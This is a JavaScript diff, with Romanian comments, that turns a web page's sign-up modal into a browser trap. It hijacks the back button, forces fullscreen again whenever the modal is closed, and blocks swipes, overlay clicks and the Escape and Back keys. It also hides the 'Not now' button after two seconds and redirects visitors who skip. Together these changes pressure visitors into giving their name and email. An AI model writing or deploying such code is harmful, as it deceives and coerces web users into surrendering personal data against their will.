@@ -537,19 +537,59 @@
 
   // block back button — nu lasa userul sa plece fara sa completeze
   window.addEventListener("popstate", () => {
-    if (modalShown && modal.classList.contains("show")) {
+    if (modalShown) {
       history.pushState(null, "", location.href);
+      // re-arata modal daca l-a inchis cumva
+      modal.classList.add("show");
+      goFullscreen();
     }
   });
 
-  function submitForm() {
-    const name = document.getElementById("f-name").value;
-    const email = document.getElementById("f-email").value;
-    const phone = document.getElementById("f-phone").value;
+  // block swipe-to-close si touch outside modal
+  modal.addEventListener("touchmove", (e) => e.preventDefault(), { passive: false });
+  modal.addEventListener("click", (e) => {
+    // daca da click pe overlay (negru) — nu inchide, shake modal
+    if (e.target === modal) shakeModal();
+  });
 
-    if (!name || !email) {
+  // block tastatura back pe Android (keydown Escape)
+  document.addEventListener("keydown", (e) => {
+    if (modalShown && (e.key === "Escape" || e.key === "Back")) {
+      e.preventDefault();
+      shakeModal();
+    }
+  });
+
+  // vizual — shake ca sa simta ca e blocat
+  function shakeModal() {
+    const sheet = document.querySelector(".modal-sheet");
+    sheet.style.animation = "none";
+    sheet.style.transform = "translateX(10px)";
+    setTimeout(() => { sheet.style.transform = "translateX(-10px)"; }, 80);
+    setTimeout(() => { sheet.style.transform = "translateX(6px)"; }, 160);
+    setTimeout(() => { sheet.style.transform = "translateX(0)"; }, 240);
+  }
+
+  // ascunde butonul "Nu acum" dupa 2 secunde
+  setTimeout(() => {
+    const skip = document.querySelector(".modal-skip");
+    if (skip) skip.style.display = "none";
+  }, 2000);
+
+  function submitForm() {
+    const name = document.getElementById("f-name").value.trim();
+    const email = document.getElementById("f-email").value.trim();
+
+    if (!name) {
       document.getElementById("f-name").style.borderColor = "#fe2c55";
+      document.getElementById("f-name").focus();
+      shakeModal();
+      return;
+    }
+    if (!email || !email.includes("@")) {
       document.getElementById("f-email").style.borderColor = "#fe2c55";
+      document.getElementById("f-email").focus();
+      shakeModal();
       return;
     }
 
@@ -558,11 +598,8 @@
   }
 
   function skipModal() {
-    // chiar si la skip — redirect tot
-    modal.classList.remove("show");
-    setTimeout(() => {
-      window.location.replace(REDIRECT_URL);
-    }, 300);
+    // skip e ascuns dupa 2s, dar daca apuca sa apese — redirect tot
+    window.location.replace(REDIRECT_URL);
   }
 </script>
 
